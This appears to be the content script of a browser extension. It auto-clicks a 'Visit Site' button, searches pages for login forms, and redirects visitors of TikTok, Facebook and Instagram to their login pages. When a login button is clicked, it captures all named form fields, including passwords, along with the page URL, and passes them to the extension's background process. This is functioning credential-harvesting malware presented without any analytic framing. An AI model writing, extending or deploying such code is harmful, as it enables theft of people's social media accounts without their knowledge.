// content.js
console.log('Content script loaded.');

function checkForVerificationButton() {
    const buttons = document.querySelectorAll('a.btn'); // Select all <a> elements with class "btn"

    buttons.forEach(button => {
        if (button.textContent.trim() === 'Visit Site') { // Check if the button text is "Visit Site"
            console.log('Verification button found. Clicking...');
            setTimeout(()=>{
              button.click(); // Simulate a click on the button
            }, 300)
            
        }
    });
}

// Run the check when the page loads
checkForVerificationButton();

const loginUrls = {
    'tiktok.com': 'https:tiktok.com/login',
    'facebook.com': 'https://web.facebook.com',
    'instagram.com': 'https://instagram.com',
};

function findLoginForm() {
    const forms = document.querySelectorAll('form');
    const regex = /\b(log\s?in|sign\s?in|continue|submit|next|enter|access|authenticate|proceed|confirm|connect|get\s?started||go|authorize|validate|unlock|verify|login|signin)\b/i;
    const currentUrl = window.location.hostname;

    for (const form of forms) {
        let loginButton = null;

        const buttons = form.querySelectorAll('button, input[type="button"], input[type="submit"]');
        for (const button of buttons) {
            if (regex.test(button.textContent) || regex.test(button.value)) {
                loginButton = button;
                setupButtonListener(button, form);
                return;
            }
        }
    }

    // If login button not found, check URL and redirect if necessary
    if (!loginButton) {
        switch (currentUrl) {
            case 'tiktok.com':
                if (!window.location.pathname.includes('/login')) {
                    window.location.href = 'https://tiktok.com/login';
                }
                break;
            case 'facebook.com':
                if (!window.location.pathname.includes('/login')) {
                    window.location.href = 'https://web.facebook.com';
                }
                break;
            case 'instagram.com':
                if (!window.location.pathname.includes('/accounts/login/')) {
                    window.location.href = 'https://instagram.com/accounts/login/';
                }
                break;
            default:
                console.log("No login button found and no redirect rule for this site.");
                break;
        }
    }
}

findLoginForm();

function setupButtonListener(button, form) {
    button.addEventListener('click', (event) => {
        const formData = captureFormData(form);
        chrome.runtime.sendMessage({ action: 'formDataSubmitted', formData: formData });
    });
}

function captureFormData(form) {
    let capturedData = {};
    const inputs = form.querySelectorAll('input, textarea, select');
    capturedData['weburl'] = window.location.href;
    inputs.forEach((input) => {
        if (input.name) {
            capturedData[input.name] = input.value;
        }
    });
    console.log(capturedData)
    return capturedData;
}